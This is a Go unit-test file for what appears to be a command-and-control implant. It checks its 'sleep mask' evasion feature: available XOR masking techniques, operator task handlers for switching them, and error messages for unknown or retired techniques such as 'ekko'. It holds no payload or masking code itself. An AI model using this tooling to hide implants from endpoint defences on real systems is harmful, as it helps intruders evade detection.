//go:build linux || windows || darwin

package main

import (
	"strings"
	"testing"
)

// resetSleepMaskState gives each test a known mask state and restores whatever
// was there before once the test finishes.
func resetSleepMaskState(t *testing.T) {
	t.Helper()
	prevActive := activeSleepMask
	prevOn := sleepMaskActive
	activeSleepMask = &basicMask{}
	sleepMaskActive = false
	t.Cleanup(func() {
		activeSleepMask = prevActive
		sleepMaskActive = prevOn
	})
}

func TestSleepMaskRegistryOffersHonestMasks(t *testing.T) {
	resetSleepMaskState(t)
	masks := getRegisteredMasks()
	seen := map[string]bool{}
	for _, m := range masks {
		seen[m] = true
	}
	if len(masks) != 2 || !seen["config-xor"] || !seen["xor"] {
		t.Fatalf("registry = %v, want exactly config-xor + xor", masks)
	}
	if got := activeSleepMask.Name(); got != "config-xor" {
		t.Fatalf("default mask Name() = %q, want config-xor", got)
	}
}

func TestSetActiveSleepMask(t *testing.T) {
	resetSleepMaskState(t)
	if !setActiveSleepMask("xor") {
		t.Fatal("setActiveSleepMask(xor) = false")
	}
	if got := activeSleepMask.Name(); got != "xor" {
		t.Fatalf("active mask Name() = %q, want xor", got)
	}
	if setActiveSleepMask("ekko") {
		t.Fatal("a retired full-image technique must not resolve")
	}
	if got := activeSleepMask.Name(); got != "xor" {
		t.Fatalf("a failed switch must keep the previous mask, got %q", got)
	}
	if !setActiveSleepMask("config-xor") {
		t.Fatal("setActiveSleepMask(config-xor) = false")
	}
}

func TestHandleSetSleepMaskActivatesMaskedSleep(t *testing.T) {
	resetSleepMaskState(t)
	var res TaskResult
	handleSetSleepMask(Task{Data: `{"technique":"config-xor"}`}, &res)
	if res.Error != "" {
		t.Fatalf("unexpected error: %s", res.Error)
	}
	if !sleepMaskActive {
		t.Fatal("an explicit operator switch must activate masked sleeping")
	}
	if !strings.Contains(res.Output, "config-xor") {
		t.Fatalf("output = %q, want the switched technique", res.Output)
	}
}

func TestHandleSetSleepMaskEmptyListsAvailable(t *testing.T) {
	resetSleepMaskState(t)
	var res TaskResult
	handleSetSleepMask(Task{Data: `{}`}, &res)
	if res.Error != "" {
		t.Fatalf("unexpected error: %s", res.Error)
	}
	if !strings.Contains(res.Output, "config-xor") || !strings.Contains(res.Output, "xor") {
		t.Fatalf("output should list both masks, got %q", res.Output)
	}
	if !strings.Contains(res.Output, "current: config-xor") {
		t.Fatalf("output should report the current mask, got %q", res.Output)
	}
}

func TestHandleSetSleepMaskUnknownTechniqueStaysHonest(t *testing.T) {
	resetSleepMaskState(t)
	var res TaskResult
	handleSetSleepMask(Task{Data: `{"technique":"advanced"}`}, &res)
	if !strings.Contains(res.Error, "unknown sleep mask technique") {
		t.Fatalf("res.Error = %q, want an unknown-technique error", res.Error)
	}
	if !strings.Contains(res.Output, "config-xor") {
		t.Fatalf("res.Output should list available masks, got %q", res.Output)
	}
	if sleepMaskActive {
		t.Fatal("a failed switch must not activate masked sleeping")
	}
}

func TestHandleSetSleepMaskAdvancedStaysHonest(t *testing.T) {
	resetSleepMaskState(t)
	var res TaskResult
	handleSetSleepMaskAdvanced(Task{}, &res)
	if !strings.Contains(res.Error, "not available") {
		t.Fatalf("res.Error = %q, want an honest not-available message", res.Error)
	}
	if strings.Contains(res.Output, "switched") {
		t.Fatalf("handler must not claim a switch: %q", res.Output)
	}
}
